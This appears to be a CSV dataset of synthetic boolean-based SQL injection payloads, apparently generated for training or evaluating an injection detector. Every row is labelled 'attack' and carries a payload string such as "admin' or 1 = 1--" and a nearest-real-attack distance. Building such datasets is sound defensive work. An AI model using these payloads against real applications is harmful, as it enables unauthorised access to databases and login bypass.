id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000001,attack,boolean,1%' and 4595  =  4595#,nearest_attack_euclidean,R000092,4.558373936163537
CTGAN_000002,attack,boolean,1%'  )   and 8734  =  5844,nearest_attack_euclidean,R000309,5.946991380016901
CTGAN_000003,attack,boolean, or uid like '%,nearest_attack_euclidean,R000036,6.700503156901588
CTGAN_000004,attack,boolean,1' and 5967  =  4184#,nearest_attack_euclidean,R000099,5.559598039791059
CTGAN_000005,attack,boolean,1'  )   and 9198  =  9198--,nearest_attack_euclidean,R000100,6.698689684277782
CTGAN_000006,attack,boolean,1' and 9970  =  3409,nearest_attack_euclidean,R000131,5.924942609420047
CTGAN_000007,attack,boolean,-8023' or 6872  =  6872,nearest_attack_euclidean,R000237,6.161040252907781
CTGAN_000008,attack,boolean,1%'  )   and 8734  =  5844,nearest_attack_euclidean,R000309,5.432335491361215
CTGAN_000009,attack,boolean,"1%"" and 2805  =  1345",nearest_attack_euclidean,R000234,5.828917715279327
CTGAN_000010,attack,boolean,1' and 4595  =  4595#,nearest_attack_euclidean,R000253,7.9636220764323955
CTGAN_000011,attack,boolean,-1587'  )   or 8339  =  5540,nearest_attack_euclidean,R000192,2.9422454852855373
CTGAN_000012,attack,boolean,end and   (  9416  =  9416,nearest_attack_euclidean,R000160,8.106126021543476
CTGAN_000013,attack,boolean,1  )   and 9198  =  9198--,nearest_attack_euclidean,R000190,5.011651270191708
CTGAN_000014,attack,boolean,-1587'  )   or 8339  =  5540,nearest_attack_euclidean,R000192,5.883561995804831
CTGAN_000015,attack,boolean,1' and 2908  =  8067--,nearest_attack_euclidean,R000275,5.885867459496084
CTGAN_000016,attack,boolean,’ or ‘1’  =  ’1,nearest_attack_euclidean,R000061,9.58898997957695
CTGAN_000017,attack,boolean,"1%"" and 2805  =  1345",nearest_attack_euclidean,R000234,5.501994870503739
CTGAN_000018,attack,boolean,-3895'  )   or 8645  =  5359--,nearest_attack_euclidean,R000270,8.056360745295487
CTGAN_000019,attack,boolean,admin' or 1  =  1--,nearest_attack_euclidean,R000086,5.0487006086706625
CTGAN_000020,attack,boolean,1' and 9198  =  9198--,nearest_attack_euclidean,R000203,6.203880185146441
CTGAN_000021,attack,boolean,or '7659'  =  '7659,nearest_attack_euclidean,R000033,4.467088772119094
CTGAN_000022,attack,boolean,1'  )   and 2564  =  3234--,nearest_attack_euclidean,R000264,7.774029231738981
CTGAN_000023,attack,boolean,-8047' or 3038  =  3038,nearest_attack_euclidean,R000276,6.902818844183824
CTGAN_000024,attack,boolean,1%' and 9198  =  9198--,nearest_attack_euclidean,R000214,7.651116627900994
CTGAN_000025,attack,boolean,1 and 9412  =  6877#,nearest_attack_euclidean,R000152,2.2239583331418937
CTGAN_000026,attack,boolean,’ or ‘1’  =  ’1,nearest_attack_euclidean,R000061,4.844717445183465
